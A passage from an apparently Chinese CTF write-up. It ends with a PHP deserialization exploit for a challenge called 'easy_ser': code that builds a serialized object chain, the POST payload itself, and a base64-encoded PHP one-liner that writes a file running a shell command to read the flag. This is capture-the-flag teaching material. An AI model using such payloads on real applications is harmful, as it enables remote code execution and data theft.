![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117160202-6wrnsr7.png?imageSlim)​

随后使用filters_chain_oracle_exploit.py脚本一把梭

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250117160101-bw70f5d.png?imageSlim)​

### easy_ser

题目内容：简单的反序列化来哩

构造序列化

```bash
<?php
class STU{

	public $stu;
}
class SDU{
	public $Dazhuan;
}
class CTF{
	public $filename='b.php';

}
$sdu=new SDU();
$stu=new STU();
$ctf=new CTF();
$sdu->Dazhuan=$stu;
$stu->stu=$ctf;
$ctf->hackman="PD89YGNhdCAvZipgOw==";
echo serialize($sdu);
```

post发包传入

```bash
O:3:"SDU":1:{s:7:"Dazhuan";O:3:"STU":1:{s:3:"stu";O:3:"CTF":2:{s:8:"filename";s:5:"b.php";s:7:"hackman";s:20:"PD89YGNhdCAvZipgOw==";}}}
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118183557-wibzjtw.png?imageSlim)​

访问/b.shell得到flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250118183400-z6b1a0m.png?imageSlim)​

‍

